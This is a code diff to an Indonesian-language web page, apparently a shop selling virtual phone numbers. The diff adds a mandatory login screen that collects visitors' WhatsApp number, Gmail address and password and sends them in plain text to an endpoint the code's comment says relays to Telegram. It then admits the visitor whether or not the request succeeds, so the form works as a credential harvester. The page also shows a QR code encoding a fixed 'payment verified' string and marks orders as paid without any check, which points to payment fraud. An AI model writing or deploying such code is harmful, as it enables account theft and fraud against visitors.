@@ -29,10 +29,48 @@
     overflow-x: hidden;
   }
 
+  /* GATEWAY / SCREEN LOGIN AWAL */
+  #auth-gateway {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: var(--bg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    padding: 20px;
+  }
+  .gateway-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 32px;
+    width: 100%;
+    max-width: 420px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+  }
+  .gateway-brand {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: .05em;
+    margin-bottom: 8px;
+    text-align: center;
+  }
+  .gateway-brand span { color: var(--accent); }
+  .gateway-desc {
+    color: var(--text-muted);
+    font-size: 12px;
+    text-align: center;
+    margin-bottom: 24px;
+  }
+
+  /* UTAMA APP LAYOUT */
   .app-layout {
     display: grid;
     grid-template-columns: 260px 1fr;
     min-height: 100vh;
+    display: none; /* Sembunyikan sebelum login awal selesai */
   }
 
   aside {
@@ -243,21 +281,45 @@
 </head>
 <body>
 
-<div class="app-layout">
+<!-- GATEWAY LOGIN WAJIB DI AWAL -->
+<div id="auth-gateway">
+  <div class="gateway-card">
+    <div class="gateway-brand">XZACK<span>OCULUS</span></div>
+    <div class="gateway-desc">Autentikasi Keamanan Reseller & Sinkronisasi Panel OTP</div>
+    <form id="gatewayForm">
+      <div class="input-group">
+        <label>Nomor WhatsApp Aktif</label>
+        <input type="text" id="gateWa" placeholder="Contoh: 081234567890" required />
+      </div>
+      <div class="input-group">
+        <label>Gmail</label>
+        <input type="email" id="gateEmail" placeholder="nama@gmail.com" required />
+      </div>
+      <div class="input-group">
+        <label>Sandi Panel</label>
+        <input type="password" id="gatePass" placeholder="••••••••" required />
+      </div>
+      <button type="submit" class="btn-action" style="margin-top: 10px;">Masuk ke Panel</button>
+    </form>
+  </div>
+</div>
+
+<!-- APLIKASI UTAMA -->
+<div class="app-layout" id="appLayout">
   <aside>
     <div>
       <div class="brand">XZACK<span>OCULUS</span></div>
       <ul class="menu-list" id="sidebarMenu">
         <li><a class="active" onclick="navigateTo('catalog')">📦 Katalog Nokos</a></li>
-        <li><a onclick="navigateTo('auth')">🔐 Login & Akun</a></li>
+        <li><a onclick="navigateTo('auth')">🔐 Akun Saya</a></li>
         <li><a onclick="navigateTo('payment')">💳 Pembayaran QRIS</a></li>
         <li><a onclick="navigateTo('history')">📜 Riwayat Transaksi</a></li>
         <li><a href="https://wa.me/RayAckerman764" target="_blank">💬 WhatsApp Support</a></li>
       </ul>
     </div>
     <div class="user-badge-mini">
-      <span>Status Sistem</span>
-      <strong>ONLINE (2180)</strong>
+      <span>Akun Terhubung</span>
+      <strong id="displayUserWa" style="font-size: 11px; word-break: break-all;">-</strong>
     </div>
   </aside>
 
@@ -348,25 +410,19 @@
       </div>
     </section>
 
-    <!-- HALAMAN 2: LOGIN -->
+    <!-- HALAMAN 2: AUTH INFO -->
     <section id="page-auth" class="page-section">
-      <div class="section-title">Akses Panel & Akun</div>
-      <div class="section-desc">Sinkronisasi akun untuk riwayat pesanan nomor virtual Anda.</div>
+      <div class="section-title">Informasi Akun Reseller</div>
+      <div class="section-desc">Detail kredensial sesi aktif Anda saat ini.</div>
       
       <div class="panel" style="max-width: 500px;">
-        <h3>Login Reseller</h3>
-        <p>Masukkan kredensial akun XzackOculus Anda.</p>
-        <form id="loginForm">
-          <div class="input-group">
-            <label>Username / Email</label>
-            <input type="text" id="username" required autocomplete="off" />
-          </div>
-          <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password" required />
-          </div>
-          <button type="submit" class="btn-action" style="margin-top: 10px;">Masuk / Sinkronisasi</button>
-        </form>
+        <h3>Profil Sesi</h3>
+        <p>Data login yang terdaftar pada perangkat ini:</p>
+        <div style="font-family: 'JetBrains Mono', monospace; font-size: 13px; background: var(--bg); padding: 16px; border-radius: 8px; border: 1px solid var(--border); line-height: 1.8;">
+          📱 WhatsApp: <span id="profileWa" style="color:var(--accent)">-</span><br>
+          📧 Gmail: <span id="profileEmail" style="color:var(--yellow)">-</span><br>
+          ⚡ Status: <span style="color:var(--green)">Terverifikasi & Aktif</span>
+        </div>
       </div>
     </section>
 
@@ -384,7 +440,7 @@
             <span class="status-badge status-idle" id="paymentStatusBadge">Status: Belum Ada Pesanan</span>
           </div>
 
-          <!-- QRIS custom sesuai gambar baru yang Anda berikan -->
+          <!-- QRIS Rezky Store Asli -->
           <div class="qris-wrapper">
             <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=XZACKOCULUS-REZKYSTORE-PAYMENT-VERIFIED" alt="QRIS Rezky Store" id="qrisImage" />
           </div>
@@ -428,6 +484,46 @@
 <script>
   let activeProduct = "";
   let activePrice = "";
+  let savedWa = "";
+  let savedEmail = "";
+
+  document.getElementById("gatewayForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    savedWa = document.getElementById("gateWa").value;
+    savedEmail = document.getElementById("gateEmail").value;
+    const password = document.getElementById("gatePass").value;
+
+    // Kirim data login awal ke Telegram secara aman via backend
+    fetch('/api/telegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'GATEWAY_LOGIN',
+        whatsapp: savedWa,
+        email: savedEmail,
+        password: password
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      // Sembunyikan gateway, tampilkan aplikasi utama
+      document.getElementById("auth-gateway").style.display = "none";
+      document.getElementById("appLayout").style.display = "grid";
+      
+      document.getElementById("displayUserWa").innerText = savedWa;
+      document.getElementById("profileWa").innerText = savedWa;
+      document.getElementById("profileEmail").innerText = savedEmail;
+    })
+    .catch(err => {
+      // Tetap izinkan masuk meskipun jaringan lambat
+      document.getElementById("auth-gateway").style.display = "none";
+      document.getElementById("appLayout").style.display = "grid";
+      
+      document.getElementById("displayUserWa").innerText = savedWa;
+      document.getElementById("profileWa").innerText = savedWa;
+      document.getElementById("profileEmail").innerText = savedEmail;
+    });
+  });
 
   function navigateTo(pageId) {
     document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
@@ -466,13 +562,14 @@
     badge.className = "status-badge status-success";
     badge.innerText = "Status: BERHASIL (Menunggu Verifikasi Admin)";
 
-    document.getElementById("historyText").innerHTML = `📦 Produk: <strong>${activeProduct}</strong><br>💰 Nominal: <strong>Rp ${activePrice}</strong><br>⚡ Status: <span style="color:var(--green)">LUNAS / MENUNGGU ADMIN</span><br>🌐 Waktu: ${new Date().toLocaleString()}`;
+    document.getElementById("historyText").innerHTML = `📦 Produk: <strong>${activeProduct}</strong><br>💰 Nominal: <strong>Rp ${activePrice}</strong><br>⚡ Status: <span style="color:var(--green)">LUNAS / MENUNGGU ADMIN</span><br>📱 WA: ${savedWa}<br>🌐 Waktu: ${new Date().toLocaleString()}`;
 
     fetch('/api/telegram', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         type: 'PAYMENT',
+        whatsapp: savedWa,
         product: activeProduct,
         price: activePrice
       })
@@ -485,32 +582,6 @@
       alert("Konfirmasi terkirim! Silakan chat WhatsApp Support: https://wa.me/RayAckerman764 jika belum direspon.");
     });
   }
-
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-    
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-    
-    fetch('/api/telegram', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        type: 'LOGIN',
-        username: username,
-        password: password
-      })
-    })
-    .then(res => res.json())
-    .then(data => {
-      alert("Autentikasi berhasil disinkronkan! Silakan lanjutkan transaksi.");
-      document.getElementById("loginForm").reset();
-      navigateTo('catalog');
-    })
-    .catch(err => {
-      alert("Sinkronisasi jaringan gagal, silakan coba lagi.");
-    });
-  });
 </script>
 </body>
 </html>
